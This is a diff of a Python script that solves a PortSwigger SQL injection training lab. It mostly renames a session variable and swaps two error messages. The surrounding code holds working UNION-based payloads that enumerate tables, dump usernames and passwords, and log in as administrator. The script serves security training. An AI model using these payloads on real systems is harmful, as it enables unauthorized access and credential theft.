@@ -2,14 +2,15 @@
 # Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
 
 import requests
-import os, sys
 from bs4 import BeautifulSoup
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-r = requests.Session()
+req = requests.Session()
+
 admin_username = 'administrator'
 password = ''
+
 poc_payload_for_users_table = "'union+SELECT+null,TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME+like+'%25users%25'--"
 payload_to_get_users_with_passwords = "='union+SELECT+null,CONCAT(username,'%23',password)+FROM+users--"
 
@@ -32,7 +33,7 @@ def get_administrator_password(response):
     return password
 
 def get_csrf_token_from_response(url):
-    response = r.get(url, verify=False, proxies=proxies)
+    response = req.get(url, verify=False, proxies=proxies)
     soup = BeautifulSoup(response.text, 'html.parser')
     csrf_token = soup.find('input')['value']
     return csrf_token
@@ -45,26 +46,26 @@ def login_as_administrator(username, password):
         'username': username,
         'password': password
     }
-    response = r.post(url=login_url, data=data, proxies=proxies, verify=False)
+    response = req.post(url=login_url, data=data, proxies=proxies, verify=False)
     if '/my-account?id=administrator' in response.text:
         print(f'Lab solved successfully and username: {admin_username}, password: {password}', end='')
     elif response.status_code == 504:
-        print(f'failed to login but username: {admin_username}, password: {password} try to login yourself', end='')
-    else:
         print('Lab is not available, please refresh the url')
+    else:
+        print(f'failed to login but username: {admin_username}, password: {password} try to login yourself', end='')        
     print()
     exit(0)
 
 
 filter_url()
 
-response = r.get(url, proxies=proxies, verify=False)
+response = req.get(url, proxies=proxies, verify=False)
 
 
 if 'users' in response.text:
     url = url.split('=', 1)[0]
     url += f"{payload_to_get_users_with_passwords}"
-    response = r.get(url, proxies=proxies, verify=False)
+    response = req.get(url, proxies=proxies, verify=False)
     if admin_username in response.text:
         password = get_administrator_password(response)
         login_as_administrator(admin_username, password)
